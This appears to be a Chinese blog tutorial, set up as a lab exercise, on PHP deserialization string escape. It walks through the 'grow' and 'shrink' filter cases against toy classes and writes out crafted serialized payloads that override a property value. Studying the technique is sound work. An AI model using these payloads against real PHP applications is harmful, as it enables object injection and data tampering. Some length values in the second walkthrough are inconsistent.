---
title: Unserialization Escaping
date: 2022-07-09 17:58:30
tags:
categories:
- code-audit
---

- [反序列化字符串逃逸](#反序列化字符串逃逸)
  - [少变多](#少变多)
        - [实验](#实验)
    - [做法](#做法)
        - [1 生成一个看起来正常的序列化字符串](#1-生成一个看起来正常的序列化字符串)
        - [2 构造最终的pass值](#2-构造最终的pass值)
        - [3 计算溢出位移，构造payload](#3-计算溢出位移构造payload)
  - [多变少](#多变少)
        - [实验代码](#实验代码)
    - [做法](#做法-1)
        - [1 生成一个看起来正常的序列化字符串](#1-生成一个看起来正常的序列化字符串-1)
        - [2 计算被吃掉部分字符串](#2-计算被吃掉部分字符串)
        - [3 构造payload拼接尾部](#3-构造payload拼接尾部)


# 反序列化字符串逃逸

## 少变多

##### 实验

    <?php
    // 少变多题目
    function filter($str){
        return str_replace('bb', 'ccc', $str);
    }

    class A{
        public $name='aaaa';
        public $pass='123456';
    }



构造顺序，从

    ";s:4:"pass";s:6:"hacker";}";s:4:"pass";s:6:"123456";}";s:4:"pass";s:6:"123456";}

开始计算

    // 得知 少变多 bb->ccc ，被篡改的s长度要大，s内容要小，才能顶出
    // 数出`";s:4:"pass";s:6:"hacker";}`部分是27长度字符，则需要顶出27
    // 顶出长度/变长位数 就是 被替换字符 的个数
    // 故输出27对"bb"


// ";s:4:"pass";s:6:"hacker";}     len:27

// 2->3 差值1   27对

    $payload = 'O:1:"A":2:{s:4:"name";s:81:"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";}";s:4:"pass";s:2:"21";}';
    echo $payload;
    echo "\n";
    $payload=filter($payload);
    echo $payload;
    echo "\n";

    $o=unserialize($payload);
    // echo $o->pass;
    echo serialize($o);

    ?>

### 做法

##### 1 生成一个看起来正常的序列化字符串

    <?php
    // exp

    class A{
        public $name='12';
        public $pass='21';
    }

    $o = new A();
    echo serialize($o);
    ?>

得到

    O:1:"A":2:{s:4:"name";s:2:"12";s:4:"pass";s:2:"21";}

##### 2 构造最终的pass值

因为我们构造的这部分代码会被“少变多”顶出去，因此我们从被构造变量的上一个变量的变量值的右引号起开始构造，构造如下这部分

    O:1:"A":2:{s:4:"name";s:2:"12";s:4:"pass";s:2:"21";}

构造为

    ";s:4:"pass";s:6:"hacker";}


##### 3 计算溢出位移，构造payload

从上一步已构造得到

    ";s:4:"pass";s:6:"hacker";}

使用python计算长度 len('";s:4:"pass";s:6:"hacker";}')，得其长度为27

已知题目是'bb' 变为 'ccc'，即 2->3，一对的长度差值多1个字节。为了顶出 27长度 的payload，我们则 27/1 == 27 ，即构造27对 'bb' 变 'ccc'

从第一步得到的字符串，直接删除name的变量值中原有字符串（即原有的“12”这种占位字符），填写27对'bb'（即54个b）和我们构造后的payload

    O:1:"A":2:{s:4:"name";s:2:"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";}";s:4:"pass";s:2:"21";}

如上payload，黄底红字是我们拼上去的，灰底紫字在未来将会被顶出去，实际作废。

最后不要忘了修改name变量值的长度，题目会将这27对bb替换为27对ccc，即变为81个长度的字符值。

因此，我们需要修改字符串长度为 81

    O:1:"A":2:{s:4:"name";s:81:"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";}";s:4:"pass";s:2:"21";}

传输此字符串，则成功结束。
发送payload，反序列化后的pass将会是 

    s:6:"hacker"

比对如下：

![2024-04-14-11-57-35](2024-04-14-11-57-35.png)

## 多变少


##### 实验代码

    <?php
    // 多变少题目
    function str_rep($string){
        return preg_replace( '/php|test/','', $string);
    }

    class A{
        public $name='aaaa';
        public $pass='123456';
    }

---

    // 先构造尾部字符串
    // ";s:4:"pass";s:6:"hacker";}";}  payload部分：这是最终要反序列化识别出来的
    // ";s:4:"pass";s:2:"222    作废部分：这部分是需要被吃的，不过这部分可以计算，比如长度是21，或者不是整倍数也可以直接改字符串使其长度是变化长度的整倍数
    // 变化：3->0或4->0，即找3或者4的倍数，然后构造 21 / 3 = 7,则写7个php

---

    $payload = 'O:1:"A":2:{s:4:"name";s:21:"phpphpphpphpphpphpphp";s:4:"pass";s:3:"221";s:4:"pass";s:6:"hacker";}"';
    echo "\n";
    $payload=str_rep($payload);
    echo $payload;
    echo "\n";

    $o=unserialize($payload);
    echo $o->pass;
    ?>

### 做法

##### 1 生成一个看起来正常的序列化字符串

    O:1:"A":2:{s:4:"name";s:2:"12";s:4:"pass";s:2:"21";}

##### 2 计算被吃掉部分字符串

如这部分

    O:1:"A":2:{s:4:"name";s:2:"12";s:4:"pass";s:3:"212";}

`";s:4:"pass";s:3:"212`
是将被吃掉的部分，计算长度是21

变化：3->0或4->0，即找3或者4的倍数。此处假设我们选择构造3的倍数，则构造 21 / 3 = 7,则写7个php。

注意，此处如果长度是22，但是遇到的题目是3->0位移为3，22不是3的整倍数，也不用太担心。“多变少”题型我们可以随意控制被吃的字符串长度（反正会被吃掉，甚至不用计算这个s的长度对不对），比如是";s:4:"pass";s:4:"2221被吃的22长度，那可以改字符串长度和字符串是21长度的";s:4:"pass";s:2:"222

那么payload现在就是";s:4:"pass";s:3:"212将会被phpphpphpphpphpphpphp吃掉。

payload如下

    O:1:"A":2:{s:4:"name";s:21:"phpphpphpphpphpphpphp";s:4:"pass";s:3:"221


##### 3 构造payload拼接尾部
根据上面提到的残缺，直接构造payload，拼接尾部构成完整的payload即可。

    ";s:4:"pass";s:6:"hacker";}"

变为

    O:1:"A":2:{s:4:"name";s:21:"phpphpphpphpphpphpphp";s:4:"pass";s:3:"221";s:4:"pass";s:6:"hacker";}"













